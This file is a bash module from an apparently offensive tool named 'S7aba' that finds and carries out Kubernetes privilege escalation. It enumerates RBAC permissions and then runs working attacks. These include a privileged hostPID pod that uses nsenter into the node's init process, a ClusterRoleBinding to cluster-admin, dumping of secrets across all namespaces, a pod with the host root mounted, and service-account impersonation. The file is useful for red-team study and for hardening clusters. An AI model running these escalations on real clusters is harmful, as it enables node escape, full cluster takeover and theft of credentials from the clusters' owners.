#!/usr/bin/env bash
# S7aba - Kubernetes Privilege Escalation Module

declare -a ESCALATION_PATHS=()

analyze_permissions() {
    log_info "Analyzing Kubernetes permissions for escalation vectors..."

    local checks=(
        "create:pods"
        "create:pods/exec"
        "create:deployments"
        "get:secrets"
        "create:clusterrolebindings"
        "create:rolebindings"
        "patch:clusterroles"
        "impersonate:users"
        "impersonate:serviceaccounts"
        "impersonate:groups"
        "create:serviceaccounts/token"
        "create:cronjobs"
        "create:daemonsets"
        "patch:pods"
        "patch:deployments"
        "update:clusterroles"
        "escalate:clusterroles"
        "bind:clusterroles"
        "create:tokenreviews"
    )

    for check in "${checks[@]}"; do
        local verb="${check%%:*}"
        local resource="${check##*:}"
        local result
        result=$(kubectl auth can-i "$verb" "$resource" 2>/dev/null)
        if [[ "$result" == "yes" ]]; then
            ESCALATION_PATHS+=("${verb}:${resource}")
        fi
    done
}

find_escalation_paths() {
    local paths=""

    # Create privileged pod
    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:pods" ]]; then
        paths+="HIGH|PrivilegedPod|Create privileged pod to escape to host node\n"
        paths+="HIGH|HostPathPod|Create pod with hostPath mount to access node filesystem\n"
        paths+="HIGH|HostPIDPod|Create pod with hostPID to access node processes\n"
    fi

    # Bind/escalate ClusterRole
    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:clusterrolebindings" ]]; then
        paths+="CRITICAL|BindClusterAdmin|Create ClusterRoleBinding to cluster-admin for current user\n"
    fi

    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:rolebindings" ]]; then
        paths+="HIGH|BindAdminRole|Create RoleBinding to admin role in current namespace\n"
    fi

    # Patch/escalate ClusterRole
    if [[ " ${ESCALATION_PATHS[*]} " =~ "escalate:clusterroles" ]] || \
       [[ " ${ESCALATION_PATHS[*]} " =~ "patch:clusterroles" ]]; then
        paths+="CRITICAL|EscalateClusterRole|Modify ClusterRole to add wildcard permissions\n"
    fi

    # Secret access
    if [[ " ${ESCALATION_PATHS[*]} " =~ "get:secrets" ]]; then
        paths+="HIGH|ReadSecrets|Read service account tokens and other secrets\n"
    fi

    # Impersonation
    if [[ " ${ESCALATION_PATHS[*]} " =~ "impersonate:users" ]] || \
       [[ " ${ESCALATION_PATHS[*]} " =~ "impersonate:serviceaccounts" ]]; then
        paths+="HIGH|Impersonate|Impersonate privileged users or service accounts\n"
    fi

    # Pod exec
    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:pods/exec" ]]; then
        paths+="HIGH|PodExec|Exec into existing privileged pods\n"
    fi

    # Patch pods/deployments
    if [[ " ${ESCALATION_PATHS[*]} " =~ "patch:pods" ]] || \
       [[ " ${ESCALATION_PATHS[*]} " =~ "patch:deployments" ]]; then
        paths+="HIGH|PatchWorkload|Modify existing pod/deployment to mount secrets or run as privileged\n"
    fi

    # CronJob creation
    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:cronjobs" ]]; then
        paths+="MEDIUM|CronJobBackdoor|Create CronJob for persistent privileged execution\n"
    fi

    # DaemonSet creation (runs on every node)
    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:daemonsets" ]]; then
        paths+="HIGH|DaemonSetAllNodes|Deploy DaemonSet to execute on every node\n"
    fi

    # SA token creation
    if [[ " ${ESCALATION_PATHS[*]} " =~ "create:serviceaccounts/token" ]]; then
        paths+="HIGH|MintSAToken|Create tokens for privileged service accounts\n"
    fi

    echo -e "$paths"
}

exploit_paths() {
    local paths="$1"
    log_warn "Select escalation path to attempt:"

    echo "$paths" | while IFS='|' read -r risk method description; do
        [[ -z "$method" ]] && continue
        echo -e "  ${YELLOW}→${RESET} ${method}"
    done

    echo ""
    read -rp "$(echo -e "${YELLOW}[?] Enter method name: ${RESET}")" selected

    case "$selected" in
        "PrivilegedPod")
            log_warn "Creating privileged pod..."
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create privileged pod with nsenter"
            else
                kubectl apply -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: s7aba-priv
  labels:
    app: s7aba
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: s7aba
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    securityContext:
      privileged: true
    stdin: true
    tty: true
YAML
                log_success "Privileged pod 's7aba-priv' created"
                log_info "Exec in: kubectl exec -it s7aba-priv -- bash"
            fi
            ;;
        "BindClusterAdmin")
            log_warn "Binding cluster-admin..."
            local user
            user=$(kubectl config view --minify -o jsonpath='{.contexts[0].context.user}' 2>/dev/null)
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would bind cluster-admin to $user"
            else
                kubectl create clusterrolebinding s7aba-admin \
                    --clusterrole=cluster-admin --user="$user" 2>/dev/null
                log_success "cluster-admin bound to $user"
            fi
            ;;
        "ReadSecrets")
            log_warn "Dumping secrets..."
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would list all secrets"
            else
                kubectl get secrets --all-namespaces -o json 2>/dev/null | \
                    jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) [\(.type)]"'
                log_success "Secrets enumerated"
            fi
            ;;
        "HostPathPod")
            log_warn "Creating hostPath pod..."
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would create pod with hostPath / mount"
            else
                kubectl apply -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: s7aba-hostpath
  labels:
    app: s7aba
spec:
  containers:
  - name: s7aba
    image: alpine
    command: ["sleep", "86400"]
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
YAML
                log_success "Pod 's7aba-hostpath' created with / mounted at /host"
            fi
            ;;
        "Impersonate")
            log_warn "Attempting impersonation..."
            log_info "Available service accounts:"
            kubectl get serviceaccounts --all-namespaces --no-headers 2>/dev/null | head -20
            read -rp "$(echo -e "${YELLOW}[?] SA to impersonate (ns:name): ${RESET}")" sa_target
            local ns="${sa_target%%:*}"
            local sa="${sa_target##*:}"
            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would impersonate $sa in $ns"
            else
                kubectl auth can-i --list --as="system:serviceaccount:${ns}:${sa}" 2>/dev/null
                log_success "Impersonated $sa — permissions listed above"
            fi
            ;;
        *)
            log_warn "Method '$selected' — manual exploitation required"
            ;;
    esac
}
